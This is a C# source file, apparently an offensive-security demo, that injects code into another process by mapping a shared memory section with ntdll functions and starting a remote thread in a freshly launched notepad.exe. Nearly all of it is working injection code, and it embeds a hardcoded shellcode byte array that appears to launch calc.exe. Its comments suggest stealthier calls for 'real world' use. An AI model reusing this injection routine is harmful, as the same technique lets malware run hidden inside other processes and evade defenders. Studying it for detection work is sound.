// section mapping with the NativeApi ntdll
// using P/INVOKE for easy demo, in real world D/INVOKE and delegates is a better option
// undocumented functions data types: http://undocumented.ntinternals.net/

// leave "There's always room for improvement" aside, This NEEDS improvment XD

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;




void print(object input)
{
    Console.WriteLine(input);
}

// function defentions
[DllImport("ntdll.dll", SetLastError =true)]
static unsafe extern void NtCreateSection(
   IntPtr *SectionHandle,
   ulong DesiredAccess,
   IntPtr ObjectAttributes ,// OPTIONAL
   long *MaximumSize, //OPTIONAL,
   ulong PageAttributess,
   ulong SectionAttributes,
   IntPtr FileHandle //OPTIONAL
);


[DllImport("ntdll.dll", SetLastError = true)]
static extern void NtMapViewOfSection(
   IntPtr SectionHandle,
   IntPtr ProcessHandle,
   ref IntPtr BaseAddress,// OPTIONAL
   ulong ZeroBits, // OPTIONAL
   ulong CommitSize,
   IntPtr SectionOffset, //OPTIONAL,
   ref ulong ViewSize,
   int InheritDisposition, // from: https://doxygen.reactos.org/db/dc9/nt__native_8h.html#a9c762429d7a9b5922b13a598ec08975faac7c7e430b324fd92ca3120f835b90d0
   ulong AllocationType ,//OPTIONAL,
   ulong Protect

);

[DllImport("ntdll.dll", SetLastError = true)]
static extern void RtlCreateUserThread(
   IntPtr ProcessHandle,
   IntPtr SecurityDescriptor,// OPTIONAL
   bool CreateSuspended,
   ulong StackZeroBits,
   ulong StackReserved,
   ulong StackCommit,
   IntPtr StartAddress,
   int StartParameter, // OPTIONAL
   ref IntPtr ThreadHandle,
   ref CLIENTID ClientID
);


// constants
// https://github.com/CCob/SharpBlock/blob/master/SharpSploit/Execution/Win32.cs  MFs defined the entire windows internals in C# XD

const uint SECTION_ALL_ACCESS = 0x10000000;
const uint SEC_COMMIT = 0x08000000;
const uint PAGE_READ_RIGHT_EXECUTE = 0x40;
const int  ViewUnmap = 2;
const uint PAGE_READWRITE = 0x04;
const uint PAGE_EXECUTEREAD = 0x20;


byte[] shellcode = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };

ulong shellcode_len = (ulong)shellcode.Length;
long shellcode_len_long = shellcode.Length; // i know how odd that looks --__("")__--


Process rproc = new Process(); // remoteProcess
rproc.StartInfo.FileName = "notepad.exe";
rproc.Start();

IntPtr CurrentProcess = Process.GetCurrentProcess().Handle;


IntPtr hSection = IntPtr.Zero; // section Handle
IntPtr Lview; // local view mapping handle
IntPtr Rview = IntPtr.Zero; // remote view mapping handle
IntPtr hThread = IntPtr.Zero;
CLIENTID cid = new();



unsafe
{
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, IntPtr.Zero, &shellcode_len_long, PAGE_READ_RIGHT_EXECUTE, SEC_COMMIT, IntPtr.Zero);
    
    if (hSection == IntPtr.Zero)
    {
        print("[-] unable to create memory section");
    }
    else { print($"[*] Created Memory Section: 0x{hSection.ToString("X4")}"); }
}



NtMapViewOfSection(hSection, CurrentProcess, ref Lview, (ulong)IntPtr.Zero.ToInt64(), (ulong)IntPtr.Zero.ToInt64(), IntPtr.Zero, ref shellcode_len, ViewUnmap, (ulong)IntPtr.Zero.ToInt64(), PAGE_READWRITE);       

if (Lview != IntPtr.Zero)
{
    print($"[*] Mapped a Local View to the Section: 0x{Lview.ToString("X4")}");
}else { print("[-] unable to Map a Local Veiw of memory Section"); Environment.Exit(0); }


Marshal.Copy(shellcode, 0, Lview, shellcode.Length);
print($"[*] copied the shellcode to the local mapping");



NtMapViewOfSection(hSection, rproc.Handle, ref Rview, (ulong)IntPtr.Zero.ToInt64(), (ulong)IntPtr.Zero.ToInt64(), IntPtr.Zero, ref shellcode_len, ViewUnmap, (ulong)IntPtr.Zero.ToInt64(), PAGE_EXECUTEREAD);
if (Rview != IntPtr.Zero)
{
    print($"[*] Mapped a Remote View to the Section: 0x{Rview.ToString("X4")}");
}
else { print("[-] unable to Map a Remote Veiw of memory Section"); Environment.Exit(0); }



print("[*] Executing shellcode");
RtlCreateUserThread(rproc.Handle, IntPtr.Zero, false, 0, 0, 0, Rview, 0, ref hThread, ref cid);
if (hThread == IntPtr.Zero)
{
   print("[-] couldn't execute the shellcode");
}



//struct
[StructLayout(LayoutKind.Sequential, CharSet =CharSet.Auto)]
public struct CLIENTID
{
    IntPtr UniqueProcess;
    IntPtr UniqueThread;
}